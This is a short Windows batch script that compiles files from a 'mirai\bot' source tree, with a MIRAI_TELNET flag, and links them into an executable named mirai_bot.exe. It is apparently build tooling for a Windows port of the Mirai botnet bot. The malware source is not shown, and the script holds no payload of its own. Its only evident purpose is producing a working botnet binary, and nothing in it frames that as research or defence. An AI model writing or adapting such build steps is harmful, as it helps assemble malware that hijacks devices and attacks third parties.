@echo off
echo Building Mirai Windows Bot...
echo.

if not exist build mkdir build
if not exist build\windows mkdir build\windows

echo Step 1: Compiling main_windows.c
gcc -c mirai\bot\main_windows.c -Imirai\bot -DMIRAI_TELNET -o build\windows\main_windows.o
if %errorlevel% neq 0 goto error

echo Step 2: Compiling util.c
gcc -c mirai\bot\util.c -Imirai\bot -o build\windows\util.o
if %errorlevel% neq 0 goto error

echo Step 3: Compiling table.c  
gcc -c mirai\bot\table.c -Imirai\bot -o build\windows\table.o
if %errorlevel% neq 0 goto error

echo Step 4: Compiling rand.c
gcc -c mirai\bot\rand.c -Imirai\bot -o build\windows\rand.o
if %errorlevel% neq 0 goto error

echo Step 5: Compiling checksum.c
gcc -c mirai\bot\checksum.c -Imirai\bot -o build\windows\checksum.o
if %errorlevel% neq 0 goto error

echo Step 6: Linking executable
gcc build\windows\main_windows.o build\windows\util.o build\windows\table.o build\windows\rand.o build\windows\checksum.o -o build\windows\mirai_bot.exe -lws2_32 -liphlpapi
if %errorlevel% neq 0 goto error

echo.
echo BUILD SUCCESS!
echo Output: build\windows\mirai_bot.exe
dir build\windows\mirai_bot.exe
goto end

:error
echo BUILD FAILED!
exit /b 1

:end
